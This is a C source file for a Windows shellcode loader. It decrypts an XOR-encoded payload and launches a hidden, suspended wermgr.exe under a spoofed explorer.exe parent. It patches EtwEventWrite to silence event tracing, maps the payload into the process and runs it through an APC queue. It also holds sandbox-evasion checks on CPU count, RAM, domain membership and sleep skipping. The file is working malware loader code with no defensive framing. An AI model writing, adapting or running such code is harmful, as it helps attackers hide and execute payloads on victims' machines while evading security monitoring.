#include <windows.h>
#include "syscalls.h"
#include "lm.h"
#include <tlhelp32.h>
//#include "processthreadsapi.h"
#pragma comment(lib, "netapi32.lib")

// mingw is whack and cant find these in header files, so have to resolve at runtime

const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

typedef BOOL (WINAPI * UPDATEPROCTHREADATTRIBUTE) (
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD                        dwFlags,
        DWORD_PTR                    Attribute,
        PVOID                        lpValue,
        SIZE_T                       cbSize,
        PVOID                        lpPreviousValue,
        PSIZE_T                      lpReturnSize
);

typedef BOOL (WINAPI* INITIALIZEPROCTHREADATTRIBUTELIST) (
        LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        DWORD                        dwAttributeCount,
        DWORD                        dwFlags,
        PSIZE_T                      lpSize
);

unsigned char shellcode[] = { 0x1e, 0x5e, 0x8f, 0x3c, 0xd5, 0xbf, 0xb2, 0xb9, 0x8b, 0xab, 0x1e, 0xe2, 0x43, 0x9b, 0xab, 0xa9, 0x90, 0xe, 0xcf, 0x9d, 0xec, 0x35, 0x41, 0x8a, 0xe9, 0xca, 0x49, 0xe, 0x45, 0xc, 0x71, 0x27, 0x6b, 0x8c, 0xab, 0xa9, 0x90, 0xa4, 0x80, 0x61, 0xa4, 0xb6, 0xa5, 0x7a, 0x1, 0xa, 0x49, 0x8f, 0xce, 0x4f, 0x0, 0xd0, 0xab, 0xba, 0x23, 0xc9, 0x9d, 0x2d, 0xa1, 0xcf, 0xa3, 0x78, 0x32, 0xdd, 0xa6, 0x87, 0x3a, 0xa0, 0x81, 0x43, 0x22, 0x86, 0xb4, 0xa5, 0x21, 0xf8, 0x9a, 0xd5, 0xe5, 0xd7, 0xa6, 0x78, 0x70, 0x43, 0xa1, 0xfb, 0x89, 0x23, 0xf2, 0x6f, 0x2d, 0x93, 0xd7, 0xc8, 0x33, 0x5e, 0x1c, 0x11, 0x32, 0xab, 0x2a, 0x11, 0x8d, 0xef, 0xaf, 0x5d, 0x20, 0x33, 0x9b, 0xe8, 0xfb, 0xe4, 0xc0, 0x66, 0x52, 0x78, 0x59, 0x5a, 0xda, 0x9d, 0xec, 0x35, 0x9, 0xf, 0x29, 0xbe, 0x2e, 0xc7, 0xcf, 0xde, 0x1, 0x1a, 0xb3, 0xf0, 0x36, 0x14, 0x95, 0x3c, 0x3a, 0xab, 0x3b, 0x10, 0x36, 0xf5, 0x11, 0xc5, 0x29, 0x33, 0xfd, 0x40, 0x38, 0xa7, 0x2a, 0x63, 0x62, 0x61, 0x9a, 0xeb, 0x92, 0x31, 0xad, 0xf4, 0x88, 0x87, 0xa8, 0xcb, 0x88, 0xb7, 0x2e, 0x7b, 0xa0, 0xdd, 0xf8, 0xa4, 0x56, 0x97, 0x90, 0x25, 0xa2, 0xdf, 0x33, 0xab, 0x24, 0x36, 0xae, 0x28, 0x21, 0xb9, 0x19, 0xae, 0x31, 0x2d, 0xf0, 0x66, 0x17, 0x23, 0x92, 0xc6, 0x1b, 0x9c, 0x3c, 0x74, 0xca, 0x8e, 0x61, 0x82, 0x48, 0x5f, 0x8f, 0x56, 0x10, 0xc9, 0xa5, 0xb1, 0x28, 0xde, 0x8d, 0x5d, 0x2a, 0xeb, 0xb1, 0xbb, 0xe3, 0x51, 0xce, 0x4d, 0x3a, 0x47, 0x29, 0x90, 0x31, 0xff, 0xa6, 0x66, 0xd8, 0xba, 0x3b, 0x8d, 0xad, 0x62, 0x13, 0x68, 0x9, 0x30, 0xe8, 0xca, 0x49, 0x8f, 0xce, 0xe, 0x51, 0x91, 0xb3, 0x65, 0xff, 0x9e, 0xd4, 0x1c, 0x73, 0xeb, 0x51, 0xc2, 0xeb, 0xd2, 0x69, 0xf3, 0xbd, 0x3, 0x39, 0x7d, 0xd2, 0xf0, 0xbd, 0x94, 0xf5, 0x3d, 0x6f, 0x47, 0xad, 0x48, 0xa4, 0xb6, 0x85, 0xa2, 0xd5, 0xcc, 0x35, 0x85, 0x4e, 0xf5, 0xb1, 0xe4, 0xfe, 0x53, 0x35, 0x8c, 0xa7, 0x73, 0x19, 0xaa, 0xb2, 0xb2, 0xe9, 0x67, 0x11, 0xd9, 0xb, 0xd9, 0xa5, 0xab, 0x5e, 0xc3, 0x84, 0x4b, 0x53, 0xa8, 0xd2, 0xda, 0x52 };
size_t shellcode_len = sizeof(shellcode);
char key[] = "VoFtT"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

void processors() {

        // Check if <X processors
        int minprocs = 2;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}

void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}

void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < 4) {
                exit(0);
        }
}

void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}

void patchETW() {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

}

void patchETWRemote(HANDLE remoteProc) {

        HANDLE targetProcHandle = remoteProc;

        DWORD oldprotect1;
        ULONG NewProtection1;

        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);
        LPVOID lpBaseAddress = EEWAddress;

        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect1);
        NtWriteVirtualMemory(targetProcHandle, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(targetProcHandle, &lpBaseAddress, &size, oldprotect1, &NewProtection1);

}

HANDLE getHandle(int processID) {

        HANDLE targetProcHandle;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        CLIENT_ID cid;
        cid.UniqueProcess = (PVOID)processID;
        cid.UniqueThread = 0;

        NtOpenProcess(&targetProcHandle, PROCESS_ALL_ACCESS, &oa, &cid);

        return targetProcHandle;

}

DWORD GetPidByName(const char* pName) {
        PROCESSENTRY32 pEntry;
        HANDLE snapshot;

        pEntry.dwSize = sizeof(PROCESSENTRY32);
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &pEntry) == TRUE) {
                while (Process32Next(snapshot, &pEntry) == TRUE) {
                        if (_stricmp(pEntry.szExeFile, pName) == 0) {
                                return pEntry.th32ProcessID;
                        }
                }
        }
        NtClose(snapshot);
        return 0;
}

void run() {

        // Have to resolve these at runtime b/c issues w/ mingw :(
        
        HMODULE hKernel32Lib = LoadLibrary("kernel32.dll");
        INITIALIZEPROCTHREADATTRIBUTELIST InitializeProcThreadAttributeList = (INITIALIZEPROCTHREADATTRIBUTELIST)GetProcAddress(hKernel32Lib, "InitializeProcThreadAttributeList");
        UPDATEPROCTHREADATTRIBUTE UpdateProcThreadAttribute = (UPDATEPROCTHREADATTRIBUTE)GetProcAddress(hKernel32Lib, "UpdateProcThreadAttribute");


        STARTUPINFOEXA info;
        PROCESS_INFORMATION processInfo;
        SIZE_T cbAttributeListSize = 0;
        PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
        HANDLE hParentProcess = NULL;
        DWORD dwPid = 0;
        ZeroMemory(&info, sizeof(STARTUPINFOEXA));


        dwPid = GetPidByName("explorer.exe"); // PARENT HERE
        if (dwPid == 0)
                dwPid = GetCurrentProcessId(); // If fails use current process as parent

        InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
        pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
        InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

        hParentProcess = getHandle(dwPid);

        UpdateProcThreadAttribute(pAttributeList,
                0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &hParentProcess,
                sizeof(HANDLE),
                NULL,
                NULL);

        info.lpAttributeList = pAttributeList;

        CreateProcessA(NULL,
                (LPSTR)"wermgr.exe", // Spawn process here
                NULL,
                NULL,
                FALSE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
                NULL,
                NULL,
                &info.StartupInfo,
                &processInfo);

        NtClose(hParentProcess);

        patchETWRemote(processInfo.hProcess); // Patch ETW Remote

        SIZE_T size = shellcode_len;
        LARGE_INTEGER sectionSize = { size };
        HANDLE sectionHandle = NULL;
        PVOID localSectionAddress = NULL;
        PVOID remoteSectionAddress = NULL;
        HANDLE curproc = GetCurrentProcess();

        XOR((char*)shellcode, shellcode_len, key, sizeof(key));
        NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
        NtMapViewOfSection(sectionHandle, curproc, &localSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_READWRITE);
        NtMapViewOfSection(sectionHandle, processInfo.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_EXECUTE_READWRITE); // change to RX


        SIZE_T byteswritten = 0;
        NtWriteVirtualMemory(curproc, localSectionAddress, shellcode, shellcode_len, &byteswritten);
        NtQueueApcThread(processInfo.hThread, (PKNORMAL_ROUTINE)remoteSectionAddress, NULL, NULL, NULL);
        NtResumeThread(processInfo.hThread, NULL);

}

// --- MAIN ---
int main() {


        //patchETW();
        //processors();
        //domainJoined();
        //ram();
        //skipSleep();
        run();

}
